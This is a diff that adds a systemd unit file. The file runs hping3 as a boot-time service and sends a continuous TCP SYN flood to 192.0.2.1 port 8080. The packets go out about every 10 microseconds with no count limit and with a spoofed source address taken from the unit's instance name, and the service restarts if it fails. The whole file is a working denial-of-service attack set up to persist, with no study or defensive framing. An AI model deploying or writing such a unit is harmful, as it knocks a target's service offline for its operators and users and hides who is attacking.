@@ -1,0 +1,10 @@
+[Unit]
+Description=Start a TCP SYN flood to 192.0.2.1:8080
+
+[Service]
+Type=simple
+ExecStart=hping3 -i u10000 -S -p 8080 -L 0 192.0.2.1 -a %i
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
